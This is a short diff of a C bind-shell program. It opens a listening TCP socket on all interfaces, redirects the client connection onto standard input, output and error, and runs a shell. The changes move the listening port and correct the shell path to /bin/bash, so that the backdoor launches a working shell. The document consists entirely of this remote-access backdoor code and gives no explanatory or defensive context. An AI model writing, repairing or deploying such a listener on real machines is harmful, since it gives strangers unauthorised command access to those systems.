@@ -12,7 +12,7 @@ int main() {
     host_sockid = socket(PF_INET, SOCK_STREAM, 0);
 
     hostaddr.sin_family = AF_INET;
-    hostaddr.sin_port = htons(7331);
+    hostaddr.sin_port = htons(7168);
     hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);
 
     bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));
@@ -25,5 +25,5 @@ int main() {
     dup2(client_sockid, 1);
     dup2(client_sockid, 2);
 
-    execve("/bin/shell", NULL, NULL);
+    execve("/bin/bash", NULL, NULL);
 }
